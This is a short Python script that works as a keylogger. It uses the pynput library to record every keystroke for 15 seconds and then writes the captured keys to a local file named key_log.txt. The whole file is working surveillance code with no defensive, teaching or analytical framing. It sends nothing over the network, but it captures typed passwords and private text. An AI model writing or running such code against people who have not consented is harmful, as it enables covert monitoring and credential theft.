import pynput.keyboard as keyboard
import threading

# List to store the keys pressed
keys = []

def on_press(key):
    try:
        # Log the key press
        keys.append(str(key.char))
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        keys.append(str(key))

def save_log():
    # Save the logged keys to a file
    with open("key_log.txt", "w") as f:
        f.write("".join(keys))

def stop_logging(listener):
    # Stop the keylogger
    listener.stop()
    save_log()

def start_keylogger():
    # Set up the keylogger listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Set a timer to stop the keylogger after 15 seconds
    timer = threading.Timer(15, stop_logging, args=(listener,))
    timer.start()

    listener.join()

if __name__ == "__main__":
    start_keylogger()
